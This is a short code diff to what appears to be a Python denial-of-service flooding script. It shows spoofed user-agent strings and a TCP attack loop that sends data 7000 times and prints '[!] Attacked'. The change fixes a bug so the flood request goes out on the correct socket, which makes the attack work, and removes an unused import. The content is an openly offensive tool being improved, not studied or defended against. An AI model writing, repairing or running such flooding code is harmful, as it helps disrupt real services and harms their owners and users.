@@ -3,7 +3,6 @@ import random
 import datetime
 import threading
 import time
-from concurrent.futures import ThreadPoolExecutor
 
 useragents = [
     'Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1',
@@ -425,8 +424,8 @@ if method == "TCP":
                 for _ in range(7000):
                     sock.send(grtools)
                     sock.send(grtools)
-                    s.sendall(str.encode(request))
-                    s.sendall(str.encode(request))
+                    sock.sendall(str.encode(request))
+                    sock.sendall(str.encode(request))
                 print("[!] Attacked ")
             except socket.error:
                 print("[!] Attacked Slow ")
